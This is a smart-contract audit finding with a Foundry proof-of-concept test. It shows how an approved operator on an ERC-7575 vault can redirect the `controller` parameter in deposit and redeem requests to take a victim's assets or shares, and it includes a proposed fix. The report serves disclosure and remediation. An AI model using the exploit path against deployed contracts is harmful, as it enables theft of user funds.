## Title
Operator Can Steal User Funds by Redirecting Controller Parameter in Async Request Functions

## Summary
The `requestDeposit()` and `requestRedeem()` functions in `ERC7575VaultUpgradeable` allow approved operators to set an arbitrary `controller` parameter when acting on behalf of an asset/share owner. This enables a malicious operator to steal user funds by transferring assets/shares from the victim while crediting the pending request to the attacker's address, who can then claim the resulting shares/assets.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ERC7575VaultUpgradeable.sol` - `requestDeposit()` (lines 341-371) and `requestRedeem()` (lines 715-751)

**Intended Logic:** The operator system is designed to allow trusted parties to manage async requests on behalf of users for convenience. When an operator acts for an owner, they should be acting FOR THE BENEFIT of that owner, not redirecting proceeds to themselves.

**Actual Logic:** The functions validate that the caller is either the owner or an approved operator, but they do NOT validate that the `controller` parameter (who receives the claimable proceeds) is related to the owner. An operator can set themselves or any arbitrary address as the controller while pulling assets/shares from the victim.

**Exploitation Path:**

1. **Social Engineering Setup**: Attacker convinces victim Alice to call `shareToken.setOperator(attacker, true)` under false pretenses (e.g., claiming it's needed for a service integration). [1](#0-0) 

2. **Steal via requestDeposit**: Attacker calls `vault.requestDeposit(10000e6, attacker, alice)` where:
   - `assets` = 10000e6 (victim's USDC)
   - `controller` = attacker (receives the shares)
   - `owner` = alice (victim providing assets)
   
   The authorization check at line 344 passes because attacker is an approved operator: [2](#0-1) 

   Assets are transferred FROM alice TO vault: [3](#0-2) 

   But pending deposit is credited to ATTACKER's controller account: [4](#0-3) 

3. **Investment Manager Fulfills**: When `fulfillDeposit(attacker, 10000e6)` is called, shares are minted and credited to attacker's claimable balance: [5](#0-4) 

4. **Attacker Claims Shares**: Attacker calls `deposit(10000e6, attacker, attacker)` and receives the shares, completing the theft: [6](#0-5) 

5. **Similar Attack via requestRedeem**: Attacker can also call `vault.requestRedeem(shares, attacker, alice)` to steal alice's shares and convert them to assets for themselves. The authorization check passes for operators: [7](#0-6) 

   Shares are pulled from victim, but claimable assets are credited to attacker: [8](#0-7) 

**Security Property Broken:** This violates the **"No Fund Theft"** invariant (#12 from README) which explicitly states "No double-claims, no reentrancy, no authorization bypass."

## Impact Explanation
- **Affected Assets**: All user assets (USDC, DAI, etc.) and share tokens in all registered vaults
- **Damage Severity**: Complete loss of deposited assets or share positions for any user who grants operator approval
- **User Impact**: Any user who has approved an operator (whether malicious initially or compromised later) is at risk. The attack is triggered the moment the malicious operator calls the request functions with themselves as controller.

## Likelihood Explanation
- **Attacker Profile**: Any address that has been approved as an operator by a victim, either through social engineering, compromised legitimate services, or insider threats
- **Preconditions**: Victim must have called `setOperator(attacker, true)` at some point
- **Execution Complexity**: Single transaction per asset type. Extremely simple to execute.
- **Frequency**: Can be exploited repeatedly for any user who has granted operator permissions, across all vault types and assets

## Recommendation

Add validation to ensure the `controller` parameter matches the `owner` when an operator (not the owner themselves) is calling these functions:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function requestDeposit, after line 344:

// CURRENT (vulnerable):
if (!(owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender))) revert InvalidOwner();

// FIXED:
bool isOwner = owner == msg.sender;
bool isOperator = IERC7540($.shareToken).isOperator(owner, msg.sender);
if (!(isOwner || isOperator)) revert InvalidOwner();
// When operator is acting on behalf of owner, controller must be the owner
if (isOperator && !isOwner && controller != owner) revert InvalidController();
```

Apply the same fix to `requestRedeem()` at line 723-726:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function requestRedeem, after line 726:

// CURRENT (vulnerable):
bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
if (!isOwnerOrOperator) {
    ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
}

// FIXED:
bool isOwner = owner == msg.sender;
bool isOperator = IERC7540($.shareToken).isOperator(owner, msg.sender);
bool isOwnerOrOperator = isOwner || isOperator;
if (!isOwnerOrOperator) {
    ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
}
// When operator is acting on behalf of owner, controller must be the owner
if (isOperator && !isOwner && controller != owner) revert InvalidController();
```

This ensures that operators can only act FOR the benefit of the owner, not redirect proceeds to themselves or arbitrary addresses.

## Proof of Concept

```solidity
// File: test/Exploit_OperatorControllerTheft.t.sol
// Run with: forge test --match-test test_OperatorStealsViaControllerRedirect -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ShareTokenUpgradeable.sol";
import "./MockAsset.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract Exploit_OperatorControllerTheft is Test {
    ERC7575VaultUpgradeable public vault;
    ShareTokenUpgradeable public shareToken;
    MockAsset public asset;
    
    address public owner = makeAddr("owner");
    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");
    address public investmentManager = makeAddr("investmentManager");
    
    function setUp() public {
        vm.startPrank(owner);
        
        asset = new MockAsset();
        
        // Deploy ShareToken with proxy
        ShareTokenUpgradeable shareTokenImpl = new ShareTokenUpgradeable();
        bytes memory shareTokenInitData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector, 
            "Test Shares", 
            "TST", 
            owner
        );
        ERC1967Proxy shareTokenProxy = new ERC1967Proxy(address(shareTokenImpl), shareTokenInitData);
        shareToken = ShareTokenUpgradeable(address(shareTokenProxy));
        
        // Deploy Vault with proxy
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector, 
            IERC20Metadata(address(asset)), 
            address(shareToken), 
            owner
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        vault = ERC7575VaultUpgradeable(address(vaultProxy));
        
        // Register vault with share token
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(investmentManager);
        
        vm.stopPrank();
        
        // Mint assets to victim
        asset.mint(victim, 100000e18);
    }
    
    function test_OperatorStealsViaControllerRedirect() public {
        uint256 stolenAmount = 10000e18;
        
        // SETUP: Victim has assets and is socially engineered into approving attacker as operator
        vm.startPrank(victim);
        asset.approve(address(vault), stolenAmount);
        shareToken.setOperator(attacker, true);
        vm.stopPrank();
        
        // Verify initial balances
        assertEq(asset.balanceOf(victim), 100000e18, "Victim should have initial assets");
        assertEq(shareToken.balanceOf(attacker), 0, "Attacker should have no shares initially");
        
        // EXPLOIT: Attacker calls requestDeposit with HIMSELF as controller and VICTIM as owner
        vm.prank(attacker);
        vault.requestDeposit(stolenAmount, attacker, victim);
        
        // Verify assets were stolen from victim
        assertEq(asset.balanceOf(victim), 90000e18, "Victim's assets should be transferred to vault");
        assertEq(asset.balanceOf(address(vault)), stolenAmount, "Vault should hold victim's assets");
        
        // Verify pending deposit is credited to ATTACKER, not victim
        assertEq(vault.pendingDepositRequest(0, attacker), stolenAmount, "Attacker should have pending deposit");
        assertEq(vault.pendingDepositRequest(0, victim), 0, "Victim should have NO pending deposit");
        
        // Investment manager fulfills the deposit FOR THE ATTACKER
        vm.prank(investmentManager);
        uint256 shares = vault.fulfillDeposit(attacker, stolenAmount);
        
        // Verify claimable shares are credited to ATTACKER
        assertEq(vault.claimableShares(attacker), shares, "Attacker should have claimable shares");
        assertEq(vault.claimableShares(victim), 0, "Victim should have NO claimable shares");
        
        // Attacker claims the shares (completing the theft)
        vm.prank(attacker);
        vault.deposit(stolenAmount, attacker, attacker);
        
        // VERIFY: Confirm exploit success - Attacker now owns shares bought with victim's assets
        assertEq(shareToken.balanceOf(attacker), shares, "Vulnerability confirmed: Attacker stole victim's assets");
        assertEq(shareToken.balanceOf(victim), 0, "Vulnerability confirmed: Victim received nothing");
    }
}
```

**Notes:**
- This vulnerability is distinct from the intended operator functionality, which should allow operators to act FOR users, not redirect proceeds to themselves
- The ERC-7540 specification does not explicitly forbid different controller/owner, but the security implication in the context of operator authorization creates an exploitable theft vector
- All existing tests only use cases where `controller == owner`, suggesting this attack path was not considered during development
- The fix is straightforward: when an operator acts on behalf of an owner, enforce that controller must be the owner

### Citations

**File:** src/ShareTokenUpgradeable.sol (L480-486)
```text
    function setOperator(address operator, bool approved) external virtual returns (bool) {
        if (msg.sender == operator) revert CannotSetSelfAsOperator();
        ShareTokenStorage storage $ = _getShareTokenStorage();
        $.operators[msg.sender][operator] = approved;
        emit OperatorSet(msg.sender, operator, approved);
        return true;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L344-344)
```text
        if (!(owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender))) revert InvalidOwner();
```

**File:** src/ERC7575VaultUpgradeable.sol (L361-361)
```text
        SafeTokenTransfers.safeTransferFrom($.asset, owner, address(this), assets);
```

**File:** src/ERC7575VaultUpgradeable.sol (L364-366)
```text
        $.pendingDepositAssets[controller] += assets;
        $.totalPendingDepositAssets += assets;
        $.activeDepositRequesters.add(controller);
```

**File:** src/ERC7575VaultUpgradeable.sol (L438-442)
```text
        $.claimableDepositShares[controller] += shares;
        $.claimableDepositAssets[controller] += assets; // Store asset amount for precise claiming

        // Mint shares to this vault (will be transferred to user on claim)
        ShareTokenUpgradeable($.shareToken).mint(address(this), shares);
```

**File:** src/ERC7575VaultUpgradeable.sol (L586-588)
```text
        if (!IERC20Metadata($.shareToken).transfer(receiver, shares)) {
            revert ShareTransferFailed();
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L723-726)
```text
        bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
        if (!isOwnerOrOperator) {
            ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L834-837)
```text
        $.claimableRedeemAssets[controller] += assets;
        $.claimableRedeemShares[controller] += shares;
        $.totalClaimableRedeemAssets += assets;
        $.totalClaimableRedeemShares += shares; // Track shares that will be burned
```
